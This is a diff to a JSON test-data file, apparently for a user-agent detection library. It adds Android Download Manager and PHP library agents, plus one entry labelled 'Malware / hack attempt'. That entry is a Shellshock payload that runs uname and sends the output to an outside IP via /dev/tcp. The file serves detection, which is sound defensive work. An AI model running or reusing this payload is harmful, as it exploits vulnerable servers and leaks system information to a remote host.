@@ -5300,5 +5300,49 @@
       "robot" : "puf",
       "robot_string" : "puf",
       "version" : "0.93"
+   },
+   "AndroidDownloadManager/5.0 (Linux; U; Android 5.0; SM-G900P Build/LRX21T)" : {
+      "browser" : "adm",
+      "browser_major" : "5",
+      "browser_minor" : ".0",
+      "browser_string" : "Android Download Manager",
+      "device" : "android",
+      "device_string" : "Android (SM-G900P)",
+      "match" : [
+         "device",
+         "android",
+         "mobile",
+         "adm",
+         "lib"
+      ],
+      "os" : "android",
+      "os_beta" : "",
+      "os_major" : "5",
+      "os_minor" : ".0",
+      "os_string" : "Android",
+      "robot" : 0
+   },
+   "(){ :; }; /bin/uname -a > /dev/tcp/104.192.0.21/53" : {
+      "browser_beta" : ".0.21/53",
+      "browser_major" : "104",
+      "browser_minor" : ".192",
+      "match" : [
+         "robot",
+         "malware"
+      ],
+      "robot" : "malware",
+      "robot_name" : "Malware / hack attempt"
+   },
+   "HTTP_Request2/2.2.1 (http://pear.php.net/package/http_request2) PHP/5.3.29" : {
+      "browser_beta" : ".1",
+      "browser_major" : "2",
+      "browser_minor" : ".2",
+      "match" : [
+         "robot",
+         "lib",
+         "phplib"
+      ],
+      "robot" : "phplib",
+      "robot_name" : "PHP http library"
    }
 }
